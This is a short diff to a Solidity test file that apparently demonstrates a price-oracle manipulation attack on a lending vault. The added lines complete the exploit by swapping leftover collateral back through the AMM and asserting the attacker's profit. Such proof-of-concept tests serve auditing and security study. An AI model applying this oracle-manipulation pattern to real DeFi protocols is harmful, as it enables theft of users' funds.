@@ -41,6 +41,11 @@ contract OracleAttackTest is Test {
         uint256 before = quote.balanceOf(attacker);
         vault.borrow(8_000e18); // honest cap was 80 QUOTE
         assertEq(quote.balanceOf(attacker) - before, 8_000e18);
+
+        uint256 leftover = coll.balanceOf(attacker); // 800
+        coll.approve(address(amm), type(uint256).max);
+        amm.swapCollForQuote(leftover);
+        assertGt(quote.balanceOf(attacker), 9_000e18); // ~16,889 held vs 9,000 start
         vm.stopPrank();
     }
 }
